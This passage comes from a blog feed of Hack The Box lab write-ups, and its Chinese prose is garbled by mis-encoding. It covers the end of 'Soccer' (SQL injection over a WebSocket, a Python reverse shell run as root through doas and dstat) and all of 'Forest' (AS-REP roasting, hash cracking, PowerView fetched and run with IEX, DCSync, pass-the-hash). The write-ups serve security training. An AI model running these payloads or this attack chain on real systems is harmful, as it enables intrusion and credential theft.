<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">echo "10.10.11.194 soc-player.soccer.htb" &gt;&gt; /etc/hosts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213154250556.png"></p>
<p>Matché¡µé¢æ²¡ä»€ä¹ˆä¸œè¥¿</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230214192851159.png"></p>
<p>é‚£æˆ‘ä»¬å°±è¯•è¯•ã€Singnupã€‘æ³¨å†Œä¸ªè´¦æˆ·ï¼Œæ³¨å†ŒæˆåŠŸ</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155344945.png"></p>
<p>ç„¶åç™»å½•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155603099.png"></p>
<p>ç™»å½•æˆåŠŸï¼Œè·³è½¬åˆ°ä¸€ä¸ªç¥¨æ®æ£€æŸ¥é¡µé¢</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213155822282.png"></p>
<p>æŸ¥çœ‹æºç ï¼Œç”¨äº†WebSocket</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213160129163.png"></p>
<h2 id="å…­ã€WebSocketå®ç°SQLæ³¨å…¥"><a href="#å…­ã€WebSocketå®ç°SQLæ³¨å…¥" class="headerlink" title="å…­ã€WebSocketå®ç°SQLæ³¨å…¥"></a>å…­ã€WebSocketå®ç°SQLæ³¨å…¥</h2><p>è¿™é‡Œæœå¯»äº†å¤§ä½¬çš„æ€è·¯ï¼Œå‚è€ƒï¼š<a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a>ï¼Œå¯ä»¥åˆ©ç”¨WebSocketï¼Œå®æ–½SQLæ³¨å…¥ã€‚åœ¨ä»»æ„ä½ç½®æ–°å»ºä»¥ä¸‹è„šæœ¬æ–‡ä»¶</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> http<span class="token punctuation">.</span>server <span class="token keyword">import</span> SimpleHTTPRequestHandler
<span class="token keyword">from</span> socketserver <span class="token keyword">import</span> TCPServer
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> unquote<span class="token punctuation">,</span> urlparse
<span class="token keyword">from</span> websocket <span class="token keyword">import</span> create_connection

ws_server <span class="token operator">=</span> <span class="token string">"ws://soc-player.soccer.htb:9091/"</span>

<span class="token keyword">def</span> <span class="token function">send_ws</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
 ws <span class="token operator">=</span> create_connection<span class="token punctuation">(</span>ws_server<span class="token punctuation">)</span>
 <span class="token comment"># If the server returns a response on connect, use below line </span>
 <span class="token comment">#resp = ws.recv() # If server returns something like a token on connect you can find and extract from here</span>
 
 <span class="token comment"># For our case, format the payload in JSON</span>
 message <span class="token operator">=</span> unquote<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">)</span> <span class="token comment"># replacing " with ' to avoid breaking JSON structure</span>
 data <span class="token operator">=</span> <span class="token string">'{"id":"%s"}'</span> <span class="token operator">%</span> message

 ws<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
 resp <span class="token operator">=</span> ws<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
 ws<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

 <span class="token keyword">if</span> resp<span class="token punctuation">:</span>
  <span class="token keyword">return</span> resp
 <span class="token keyword">else</span><span class="token punctuation">:</span>
  <span class="token keyword">return</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">middleware_server</span><span class="token punctuation">(</span>host_port<span class="token punctuation">,</span>content_type<span class="token operator">=</span><span class="token string">"text/plain"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>

 <span class="token keyword">class</span> <span class="token class-name">CustomHandler</span><span class="token punctuation">(</span>SimpleHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
  <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
   self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>
   <span class="token keyword">try</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>self<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>query<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
   <span class="token keyword">except</span> IndexError<span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token boolean">False</span>
    
   <span class="token keyword">if</span> payload<span class="token punctuation">:</span>
    content <span class="token operator">=</span> send_ws<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
   <span class="token keyword">else</span><span class="token punctuation">:</span>
    content <span class="token operator">=</span> <span class="token string">'No parameters specified!'</span>

   self<span class="token punctuation">.</span>send_header<span class="token punctuation">(</span><span class="token string">"Content-type"</span><span class="token punctuation">,</span> content_type<span class="token punctuation">)</span>
   self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>
   self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
   <span class="token keyword">return</span>

 <span class="token keyword">class</span> <span class="token class-name">_TCPServer</span><span class="token punctuation">(</span>TCPServer<span class="token punctuation">)</span><span class="token punctuation">:</span>
  allow_reuse_address <span class="token operator">=</span> <span class="token boolean">True</span>

 httpd <span class="token operator">=</span> _TCPServer<span class="token punctuation">(</span>host_port<span class="token punctuation">,</span> CustomHandler<span class="token punctuation">)</span>
 httpd<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Starting MiddleWare Server"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] Send payloads in http://localhost:8081/?id=*"</span><span class="token punctuation">)</span>

<span class="token keyword">try</span><span class="token punctuation">:</span>
 middleware_server<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span><span class="token number">8081</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span>
 <span class="token keyword">pass</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…ˆè¿è¡Œè„šæœ¬ï¼Œåå¼€å¯sqlmap</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u "http://localhost:8081/?id=1"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213161248274.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230213161735481.png"></p>
<p>æ­»æ´»æµ‹ä¸å‡ºæ¥ï¼Œåé¢å‡çº§sqlmapï¼Œè¿˜ä¸è¡Œï¼Œç›¯äº†ä¸¤å¤©ï¼Œçœ‹äº†å¥½å‡ ä¸ªå¤§ä½¬çš„æ€è·¯ï¼Œç¡®å®šè¿™ä¸ªsqlæ³¨å…¥æ˜¯å¿…ç»ä¹‹è·¯ï¼Œæ— å¥ˆï¼Œåªèƒ½ç™½å«–å¤§ä½¬çš„æ³¨å…¥ç»“æœï¼ˆå¦‚æœ‰å¤§ä½¬æœ‰æ€è·¯ï¼Œçƒ¦è¯·æŒ‡ç‚¹ä¸€äºŒï¼‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sqlmap -u â€œhttp://localhost:8081/?id="
sqlmap -u â€œhttp://localhost:8081/?id=" --current-db
sqlmap -u â€œhttp://localhost:8081/?id=" -D soccer_db --tables
sqlmap -u "http://localhost:8081/?id=" -D soccer_db -T accounts --dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">+------+-------------------+----------+----------------------+
| id   | email             | username | password             |
+------+-------------------+----------+----------------------+
| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |
+------+-------------------+----------+----------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åSSHè¿ä¸Šè¿™ä¸ªplayerç”¨æˆ·</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215095448809.png"></p>
<h2 id="ä¸ƒã€doaså’Œdstatè”åŠ¨ææƒ"><a href="#ä¸ƒã€doaså’Œdstatè”åŠ¨ææƒ" class="headerlink" title="ä¸ƒã€doaså’Œdstatè”åŠ¨ææƒ"></a>ä¸ƒã€doaså’Œdstatè”åŠ¨ææƒ</h2><p>æ¥ä¸‹æ¥å°±æ˜¯ææƒï¼Œæˆ‘ä»¬ç”¨doaså’Œdstatè”åŠ¨ææƒ</p>
<p><a href="https://man.openbsd.org/doas">doas</a>ï¼šä»¥å…¶ä»–ç”¨æˆ·èº«ä»½æ‰§è¡Œå‘½ä»¤ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥å¯¹å…¶è¿›è¡Œè®¾å®šï¼Œèµ‹äºˆæŒ‡å®šä½¿ç”¨è€…æ‰§è¡Œç‰¹å®šæŒ‡ä»¤çš„æƒé™ã€‚</p>
<p><a href="https://linux.die.net/man/1/dstat">dstat</a>ï¼šç”¨äºç”Ÿæˆç³»ç»Ÿèµ„æºç»Ÿè®¡ä¿¡æ¯çš„å¤šåŠŸèƒ½å·¥å…·ã€‚</p>
<p>å…³é”®ç‚¹å°±åœ¨äºç”¨æˆ·å¯ä»¥ç»™dstatæ·»åŠ æŸ¥çœ‹ç³»ç»Ÿèµ„æºçš„è„šæœ¬æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è„šæœ¬æ–‡ä»¶ä¸­åˆ©ç”¨socketæ¥å»ºç«‹è¿æ¥ï¼Œä»è€Œè·å–shellã€‚</p>
<p>æˆ‘ä»¬ç”¨ä¸‹åˆ—æŸ¥æ‰¾å‘½ä»¤ï¼Œå¯ä»¥å‘ç°é¶æœºåŒ…å«dstatå·¥å…·</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find / -type d -name dstat 2&gt;/dev/null	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ³¨ï¼šç”±äºfindåœ¨åŒ¹é…æŸ¥æ‰¾è¿‡ç¨‹ä¸­ï¼Œä¼šæœ‰éƒ¨åˆ†ç›®å½•æ— å¯è¯»æƒé™ï¼Œä»è€Œä¼šäº§ç”Ÿâ€œPermission deniedâ€çš„é”™è¯¯æç¤ºï¼Œæ­¤å¤„â€œ2&gt;/dev/nullâ€æ˜¯ä¸ºäº†è¿‡æ»¤æ‰è¿™äº›æç¤ºï¼Œç®€åŒ–è¾“å‡ºç»“æœã€‚â€œ2&gt;/dev/nullâ€è¡¨ç¤ºé‡å®šå‘é”™è¯¯æç¤ºä¿¡æ¯ï¼ˆstderrï¼‰åˆ°â€œ/dev/nullâ€ï¼Œâ€œ/dev/nullâ€æ˜¯ä¸€ä¸ªä¸å­˜åœ¨çš„ç©ºè®¾å¤‡ã€‚</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215100431891.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215210503946.png"></p>
<p>å¯ä»¥çœ‹åˆ°dstatæ–‡ä»¶çš„æ ¼å¼éƒ½æ˜¯dstat_*.py</p>
<p>å®˜æ–¹ç»™å‡ºçš„å¯èƒ½åŒ…å«å¤–éƒ¨dstat_*.pyæ’ä»¶çš„ç›®å½•æœ‰å¦‚ä¸‹å‡ ä¸ª</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">~/.dstat/
(path of binary)/plugins/
/usr/share/dstat/
/usr/local/share/dstat/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æˆ‘ä»¬å¯ä»¥åœ¨/usr/local/share/dstatç›®å½•æ–°å»ºdstat_wa0er.pyï¼Œå†…å®¹å¦‚ä¸‹</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os<span class="token punctuation">;</span>
s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span><span class="token punctuation">;</span>
s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"10.10.16.15"</span><span class="token punctuation">,</span><span class="token number">3030</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">#æ­¤å¤„ipåŠç«¯å£ä¾ç„¶å¯¹åº”å¼€å¯ç›‘å¬çš„ä¸»æœºå’Œç«¯å£</span>

os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> pty<span class="token punctuation">;</span> pty<span class="token punctuation">.</span>spawn<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¼€å¯ç«¯å£ç›‘å¬</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nc -nvlp 3030<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å€ŸåŠ©doasï¼Œä»¥rootèº«ä»½æ‰§è¡Œdstatå‘½ä»¤ï¼Œä»è€Œæ‰§è¡Œdstat_wa0er.py</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">doas -u root /usr/bin/dstat --wa0er<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215165010075.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230215164918441.png"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬æˆåŠŸæ‹¿åˆ°rootæƒé™</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://systemweakness.com/soccer-hack-the-box-f02665c71abe">Soccer â€” Hack The Box</a></p>
<p><a href="https://infosecwriteups.com/soccer-hack-the-box-writeup-with-flag-2023-de695a0e54ec">Hack The Box â€” Soccer Machine Simple Writeup by Karthikeyan Nagaraj</a></p>
<p><a href="https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html">Automating Blind SQL injection over WebSocket</a></p>
<p><a href="https://github.com/rayhan0x01/nodejs-websocket-sqli">NodeJS WebSocket SQLi vulnerable WebApp</a></p>
<p><a href="https://man.openbsd.org/doas.conf.5">doas</a></p>
<p><a href="https://linux.die.net/man/1/dstat">dstat</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Tiny File Managerå¼±å£ä»¤</tag>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
        <tag>ngnix</tag>
        <tag>WebSocketå®ç°SQLæ³¨å…¥</tag>
        <tag>doaså’Œdstatè”åŠ¨ææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Forest</title>
    <url>/posts/9ab855b5.html</url>
    <content><![CDATA[<h1 id="HTB-Forest"><a href="#HTB-Forest" class="headerlink" title="HTB-Forest"></a>HTB-Forest</h1><h2 id="ä¸€ã€æ€è·¯æ¦‚è¦"><a href="#ä¸€ã€æ€è·¯æ¦‚è¦" class="headerlink" title="ä¸€ã€æ€è·¯æ¦‚è¦"></a>ä¸€ã€æ€è·¯æ¦‚è¦</h2><p>ä¸»è¦å·¥å…·ï¼š</p>
<p>rpcclientï¼šå»ºç«‹null sessionå¹¶æ‰§è¡Œenumdomusersåˆ—ä¸¾åŸŸå†…ç”¨æˆ·</p>
<p>ldapsearchï¼šåˆ—ä¸¾åŸŸå†…ç”¨æˆ·</p>
<p>impacket-GetNPUsersï¼šæšä¸¾ç”¨æˆ·ä¿¡æ¯</p>
<p>crackmapexecï¼šç™»å½•smbæˆ–winrmæœåŠ¡</p>
<p>evil-winrmï¼šç™»å½•winrmæœåŠ¡</p>
<p>bloodhound-pythonï¼šè·å–Active Directoryä¿¡æ¯</p>
<p>impacket-secretsdumpï¼šæŠŠAdministratorçš„hashç»™dumpä¸‹æ¥ï¼ˆhashè½¬å‚¨ï¼‰</p>
<h2 id="äºŒã€ä¿¡æ¯æ”¶é›†"><a href="#äºŒã€ä¿¡æ¯æ”¶é›†" class="headerlink" title="äºŒã€ä¿¡æ¯æ”¶é›†"></a>äºŒã€ä¿¡æ¯æ”¶é›†</h2><p>nmapæ‰«æ</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -A 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801104930654.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801104953705.png"></p>
<p>å¼€æ”¾çš„ç«¯å£æœåŠ¡æŒºå¤šçš„ï¼Œé¿å…é—æ¼ï¼Œå†ç”¨å¦‚ä¸‹å‘½ä»¤æ‰«ä¸€é</p>
<pre class="line-numbers language-none"><code class="language-none">nmap -p- --min-rate 10000 -Pn -sT 10.10.10.161
nmap -p- --min-rate 10000 -Pn -sU 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801170650296.png"></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801170707492.png"></p>
<h2 id="ä¸‰ã€RPCBind"><a href="#ä¸‰ã€RPCBind" class="headerlink" title="ä¸‰ã€RPCBind"></a>ä¸‰ã€RPCBind</h2><p>ç”¨rpcclientå»ºç«‹null sessionï¼ˆå³ä¸éœ€è¦ç”¨æˆ·åå’Œå£ä»¤ï¼‰ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤åˆ—ä¸¾åŸŸå†…ç”¨æˆ·</p>
<pre class="line-numbers language-none"><code class="language-none">rpcclient -U "" -N -c enumdomusers 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801105118398.png"></p>
<p>å…¶ä¸­æœ‰ä¸€äº›<code>SM_</code>å’Œ<code>HealthMailbox</code>å¼€å¤´çš„ç”¨æˆ·æ˜¯å¾®è½¯Exchangeé‚®ä»¶æœåŠ¡ç›¸å…³ç”¨æˆ·ï¼Œå¯ä»¥å¿½ç•¥</p>
<p>å¦ä¸€ç§åˆ—ä¸¾åŸŸå†…ç”¨æˆ·çš„æ–¹æ³•æ˜¯ç”¨ldapsearchï¼Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">ldapsearch -x -b "dc=htb,dc=local" "*" -H ldap://10.10.10.161 | grep userPrincipalName -T<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801105613019.png"></p>
<p>ç„¶åæˆ‘ä»¬æŠŠç”¨æˆ·ä¿å­˜åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸­</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801141741999.png"></p>
<h2 id="å››ã€AS-REP-Roasting"><a href="#å››ã€AS-REP-Roasting" class="headerlink" title="å››ã€AS-REP Roasting"></a>å››ã€AS-REP Roasting</h2><p>ç”¨impacket-GetNPUsersæšä¸¾ç”¨æˆ·ä¿¡æ¯</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-GetNPUsers htb.local/ -usersfile users.txt -dc-ip 10.10.10.161<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801141710900.png"></p>
<p>è·å–åˆ°svc-alfrescoç”¨çš„çš„hashï¼Œä¿å­˜åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ä¸­</p>
<pre class="line-numbers language-none"><code class="language-none">$krb5asrep$23$svc-alfresco@HTB.LOCAL:0f16da7878199001a313c8d8fa5f4954$c12e97e4c0dc193904026abe565b276765c563f613e0a802e4ab5b567c6dc280194233cbbdc40813f6419cbb3072815f488be8c4af44646a46c02119c901099b34a562e0f18751b39b2de2ef108a5ee09d9131849e9fe5169e51ee585ae604810cd154f010fbd3b6a00c31e982ff23242c86d4e00c3c0e97ada71e93241f798e6ca453b3850807795d2b7910c7cfb56a9ec53b5b1425470b9a9408bb71c02456f7540c7d9d9c48687cc935a99d8c9799e0ad16022119ce88ecb84666393d1c91bdf26470464171641c6525c5d3026ce06bed360a6ca93305275419d1f478f10a92a8d006a23e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç”¨johnæŒ‡å®šå­—å…¸ï¼Œçˆ†ç ´hash</p>
<pre class="line-numbers language-none"><code class="language-none">john -w=/usr/share/wordlists/rockyou.txt hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801141949973.png"></p>
<p>çˆ†ç ´æˆåŠŸï¼Œç”¨æˆ·ååŠå£ä»¤å·²çŸ¥ï¼Œç”¨crackmapexecéªŒè¯æ­¤è´¦æˆ·</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801142225862.png"></p>
<p>éªŒè¯æˆåŠŸï¼Œç¡®è®¤æ­¤è´¦æˆ·æ­£ç¡®</p>
<h2 id="äº”ã€WinRM"><a href="#äº”ã€WinRM" class="headerlink" title="äº”ã€WinRM"></a>äº”ã€WinRM</h2><p>ç„¶åæŠŠsmbæ›´æ¢æˆwinrmï¼Œçœ‹æ˜¯å¦æœ‰ç™»å½•winrmæœåŠ¡çš„æƒé™</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec winrm 10.10.10.161 -u svc-alfresco -p s3rvice -d htb.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801142320010.png"></p>
<p>ç¡®å®æœ‰winrmæœåŠ¡çš„æƒé™ï¼Œç”¨evil-winrmç™»å½•ï¼Œå¦‚ä¸‹å›¾ï¼Œç™»å½•æˆåŠŸ</p>
<pre class="line-numbers language-none"><code class="language-none">evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801142524093.png"></p>
<h2 id="å…­ã€æƒé™æå‡"><a href="#å…­ã€æƒé™æå‡" class="headerlink" title="å…­ã€æƒé™æå‡"></a>å…­ã€æƒé™æå‡</h2><p>ç”¨bloodhound-pythonè·å–Active Directoryä¿¡æ¯</p>
<pre class="line-numbers language-none"><code class="language-none">bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 --zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801144028757.png"></p>
<p>æ·»åŠ æ–°ç”¨æˆ·wa0erï¼Œå¹¶æŠŠç”¨æˆ·æ”¾åˆ°â€Exchange Windows Permissionsâ€ç”¨æˆ·ç»„å’Œâ€Remote Management Usersâ€ç”¨æˆ·ç»„</p>
<pre class="line-numbers language-none"><code class="language-none">net user wa0er password /add /domain
net group "Exchange Windows Permissions" wa0er /add
net localgroup "Remote Management Users" wa0er /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801150152253.png"></p>
<p>éªŒè¯ç”¨æˆ·æœ‰æ•ˆæ€§</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 10.10.10.161 -u wa0er -p 'password' -d htb.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801150244367.png"></p>
<p>å†™DACL</p>
<p>æœ¬åœ°kaliå¼€å¯http.serveræœåŠ¡</p>
<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>é¶æœºevil-winrmçª—å£ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">(New-Object System.Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1') | IEX
$SecPass = ConvertTo-SecureString 'password' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\wa0er', $SecPass)
Add-ObjectACL -PrincipalIdentity wa0er -Credential $Cred -Rights DCSync<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç°åœ¨ç”¨æˆ·wa0eræœ‰äº†DCSyncæƒé™</p>
<p>ç”¨impacket-secretsdumpæŠŠAdministratorçš„hashç»™dumpä¸‹æ¥ï¼ˆhashè½¬å‚¨ï¼‰</p>
<pre class="line-numbers language-none"><code class="language-none">impacket-secretsdump htb.local/wa0er@10.10.10.161 -just-dc-user Administrator -just-dc-ntlm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801152453337.png"></p>
<p>ç”¨crackmapexecå’Œä¼ é€’Administratorçš„hashï¼Œæ‰§è¡Œå‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">crackmapexec smb 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -d htb.local -x "dir C:\Users\Administrator\Desktop"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801153226732.png"></p>
<p>ä¼šæœ‰ä¸€äº›æŠ¥é”™ï¼Œä½†æ— ä¼¤å¤§é›…</p>
<p>å¯çœ‹åˆ°æˆåŠŸä»¥Administratorèº«ä»½æ‰§è¡Œä»»æ„å‘½ä»¤</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230801153337903.png"></p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://axcheron.github.io/writeups/htb/forest/">https://axcheron.github.io/writeups/htb/forest/</a></p>
]]></content>
      <categories>
        <category>é¶æœº</category>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>winrm</tag>
        <tag>rpcclient</tag>
        <tag>ldapsearch</tag>
        <tag>impacket</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-Devel</title>
    <url>/posts/97f065fe.html</url>
